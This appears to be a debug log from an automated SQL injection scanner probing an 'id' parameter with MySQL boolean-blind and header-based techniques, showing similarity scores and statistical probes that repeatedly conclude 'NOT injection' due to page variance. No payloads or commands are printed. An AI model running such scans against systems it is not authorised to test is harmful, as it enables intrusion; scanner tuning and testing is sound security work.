+[*] testing 'MySQL AND boolean-based blind' (param='id' req#418)
+    [B-bool] [MySQL] 'id' req#344 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#352 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#353)
+[*]    Wasserstein comparison probe (param='id' req#345)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#419)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#420)
+    [B-bool] [MySQL] 'id' req#346 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#347)
+    [B-bool] [MySQL] 'id' req#354 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#355)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#421)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#422)
+    [B-bool] [MySQL] 'id' req#356 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#357)
+    [B-bool] [MySQL] 'id' req#348 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#349)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#423)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#424)
+    [B-bool] [MySQL] 'id' req#350 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#351)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#425)
+    [B-bool] [MySQL] 'id' req#358 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#359)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#426)
+    [B-bool] [MySQL] 'id' req#352 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#353)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#427)
+    [B-bool] [MySQL] 'id' req#360 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#361)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#428)
+    [B-bool] [MySQL] 'id' req#362 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#363)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#429)
+    [B-bool] [MySQL] 'id' req#364 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#365)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#430)
+    [B-bool] [MySQL] 'id' req#366 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#367)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#431)
+    [B-bool] [MySQL] 'id' req#368 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#369)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#432)
+    [B-bool] [MySQL] 'id' req#370 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#371)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#433)
+    [B-bool] [MySQL] 'id' req#372 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#373)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#434)
+    [B-bool] [MySQL] 'id' req#354 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#355)
+[*]   [Wasserstein] dist=0.6742 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6661 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#435)
+    [B-bool] [MySQL] 'id' req#374 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#375)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#436)
+    [B-bool] [MySQL] 'id' req#356 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#357)
+[*]   [Wasserstein] dist=0.6732 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6661 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#437)
+    [B-bool] [MySQL] 'id' req#376 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#377)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#438)
+    [B-bool] [MySQL] 'id' req#358 sim=0.641 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#359)
+[*]   [Wasserstein] dist=0.6816 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6661 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#439)
+    [B-bool] [MySQL] 'id' req#360 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#361)
+[*]   [Wasserstein] dist=0.6785 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6662 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#440)
+    [B-bool] [MySQL] 'id' req#378 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#379)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#441)
+    [B-bool] [MySQL] 'id' req#362 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#363)
+[*]   [Wasserstein] dist=0.6729 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6729 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#442)
+    [B-bool] [MySQL] 'id' req#380 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#381)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#443)
+    [B-bool] [MySQL] 'id' req#382 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#383)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#444)
+    [B-bool] [MySQL] 'id' req#364 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#365)
+[*]   [Wasserstein] dist=0.6706 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6706 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#445)
+    [B-bool] [MySQL] 'id' req#384 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#385)
+    [B-bool] [MySQL] 'id' req#366 sim=0.656 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#367)
+[*]   [Wasserstein] dist=0.6731 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6706 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#446)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#447)
+    [B-bool] [MySQL] 'id' req#386 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#368 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#369)
+[*]   [Wasserstein] dist=0.6710 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6706 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#448)
+[*]    Wasserstein comparison probe (param='id' req#387)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#449)
+    [B-bool] [MySQL] 'id' req#370 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#388 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#389)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#450)
+[*]    Wasserstein comparison probe (param='id' req#371)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#451)
+    [B-bool] [MySQL] 'id' req#390 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#391)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#452)
+    [B-bool] [MySQL] 'id' req#372 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#373)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#453)
+    [B-bool] [MySQL] 'id' req#374 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#375)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#454)
+    [B-bool] [MySQL] 'id' req#392 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#393)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#455)
+    [B-bool] [MySQL] 'id' req#376 sim=0.641 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#394 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#395)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#456)
+[*]    Wasserstein comparison probe (param='id' req#377)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#457)
+    [B-bool] [MySQL] 'id' req#396 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#397)
+[*]   [Wasserstein] dist=0.6725 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6661 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#458)
+    [B-bool] [MySQL] 'id' req#378 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#379)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#459)
+    [B-bool] [MySQL] 'id' req#398 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#399)
+[*]   [Wasserstein] dist=0.6710 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6664 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#460)
+    [B-bool] [MySQL] 'id' req#380 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#381)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#461)
+    [B-bool] [MySQL] 'id' req#382 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#400 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#401)
+[*]   [Wasserstein] dist=0.6665 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6665 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#462)
+    [B-bool] [MySQL] 'id' req#402 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#403)
+[*]   [Wasserstein] dist=0.6663 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6663 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#463)
+    [B-bool] [MySQL] 'id' req#404 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#405)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#464)
+[*]    Wasserstein comparison probe (param='id' req#383)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#465)
+    [B-bool] [MySQL] 'id' req#406 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#407)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#466)
+    [B-bool] [MySQL] 'id' req#384 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#385)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#467)
+    [B-bool] [MySQL] 'id' req#408 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#409)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#468)
+    [B-bool] [MySQL] 'id' req#386 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#387)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#469)
+    [B-bool] [MySQL] 'id' req#410 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#411)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#470)
+    [B-bool] [MySQL] 'id' req#388 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#412 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#413)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#471)
+[*]    Wasserstein comparison probe (param='id' req#389)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#472)
+    [B-bool] [MySQL] 'id' req#414 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#415)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#473)
+    [B-bool] [MySQL] 'id' req#390 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#416 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#417)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#474)
+[*]    Wasserstein comparison probe (param='id' req#391)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#475)
+    [B-bool] [MySQL] 'id' req#418 sim=0.641 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#419)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#476)
+    [B-bool] [MySQL] 'id' req#392 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#420 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#421)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#477)
+[*]    Wasserstein comparison probe (param='id' req#393)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#478)
+    [B-bool] [MySQL] 'id' req#422 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#394 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#423)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#479)
+[*]    Wasserstein comparison probe (param='id' req#395)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#480)
+    [B-bool] [MySQL] 'id' req#424 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#425)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#481)
+    [B-bool] [MySQL] 'id' req#396 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#426 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#427)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#482)
+[*]    Wasserstein comparison probe (param='id' req#397)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#483)
+    [B-bool] [MySQL] 'id' req#398 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#428 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#429)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#484)
+[*]    Wasserstein comparison probe (param='id' req#399)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#485)
+    [B-bool] [MySQL] 'id' req#430 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#400 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#431)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#486)
+[*]    Wasserstein comparison probe (param='id' req#401)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#487)
+    [B-bool] [MySQL] 'id' req#432 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#402 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#433)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#488)
+[*]    Wasserstein comparison probe (param='id' req#403)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#489)
+    [B-bool] [MySQL] 'id' req#404 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#405)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#490)
+    [B-bool] [MySQL] 'id' req#434 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#435)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#491)
+    [B-bool] [MySQL] 'id' req#406 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#407)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#492)
+    [B-bool] [MySQL] 'id' req#408 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#409)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#493)
+    [B-bool] [MySQL] 'id' req#436 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#410 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#411)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#494)
+[*]    Wasserstein comparison probe (param='id' req#437)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#495)
+    [B-bool] [MySQL] 'id' req#412 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#413)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#496)
+    [B-bool] [MySQL] 'id' req#414 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#415)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#497)
+    [B-bool] [MySQL] 'id' req#438 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#439)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#498)
+    [B-bool] [MySQL] 'id' req#416 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#417)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#499)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#500)
+    [B-bool] [MySQL] 'id' req#418 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#501)
+[*]    Wasserstein comparison probe (param='id' req#419)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#502)
+    [B-bool] [MySQL] 'id' req#420 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#442 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#443)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#503)
+[*]    Wasserstein comparison probe (param='id' req#421)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#504)
+    [B-bool] [MySQL] 'id' req#444 sim=0.641 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#445)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#505)
+    [B-bool] [MySQL] 'id' req#422 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#446 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#447)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#506)
+[*]    Wasserstein comparison probe (param='id' req#423)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#507)
+    [B-bool] [MySQL] 'id' req#448 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#449)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#508)
+    [B-bool] [MySQL] 'id' req#424 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#425)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#509)
+    [B-bool] [MySQL] 'id' req#450 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#451)
+[*] [TECH-NODIFF] PUT:MySQL:B: 100 consecutive no-diff responses — rotating to next tech
+[*] ├─ [1/10] MySQL › Boolean    │ tech=BH   │ 634 base payloads (3181 expanded)
+[*] testing 'MySQL header boolean-blind' (param='id' req#510)
+    [B-bool] [MySQL] 'id' req#426 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#427)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#511)
+    [B-bool] [MySQL] 'id' req#452 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#453)
+[*] testing 'MySQL header boolean-blind' (param='id' req#512)
+    [B-bool] [MySQL] 'id' req#428 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#429)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#513)
+    [B-bool] [MySQL] 'id' req#454 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#455)
+[*] testing 'MySQL header boolean-blind' (param='id' req#514)
+    [B-bool] [MySQL] 'id' req#430 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#431)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#515)
+    [B-bool] [MySQL] 'id' req#456 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#457)
+[*] testing 'MySQL header boolean-blind' (param='id' req#516)
+    [B-bool] [MySQL] 'id' req#432 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#433)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#517)
+    [B-bool] [MySQL] 'id' req#458 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#459)
+[*]   [Wasserstein] dist=0.6660 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#518)
+    [B-bool] [MySQL] 'id' req#434 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#460 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#461)
+[*]   [Wasserstein] dist=0.6660 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#519)
+[*]    Wasserstein comparison probe (param='id' req#435)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#520)
+    [B-bool] [MySQL] 'id' req#462 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#463)
+[*]   [Wasserstein] dist=0.6660 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#521)
+    [B-bool] [MySQL] 'id' req#436 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#437)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#522)
+    [B-bool] [MySQL] 'id' req#464 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#465)
+[*]   [Wasserstein] dist=0.6659 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#523)
+    [B-bool] [MySQL] 'id' req#438 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#439)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#524)
+    [B-bool] [MySQL] 'id' req#466 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#467)
+[*]   [Wasserstein] dist=0.6660 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#525)
+    [B-bool] [MySQL] 'id' req#440 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#441)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#526)
+    [B-bool] [MySQL] 'id' req#468 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#469)
+[*]   [Wasserstein] dist=0.6660 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#527)
+    [B-bool] [MySQL] 'id' req#442 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#443)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#528)
+    [B-bool] [MySQL] 'id' req#444 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#470 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#471)
+[*]   [Wasserstein] dist=0.6659 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#529)
+[*]    Wasserstein comparison probe (param='id' req#445)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#530)
+    [B-bool] [MySQL] 'id' req#472 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#473)
+[*]   [Wasserstein] dist=0.6659 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#531)
+    [B-bool] [MySQL] 'id' req#446 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#447)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#532)
+    [B-bool] [MySQL] 'id' req#474 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#475)
+[*]   [Wasserstein] dist=0.6659 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#533)
+    [B-bool] [MySQL] 'id' req#448 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#476 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#477)
+[*] testing 'MySQL header boolean-blind' (param='id' req#534)
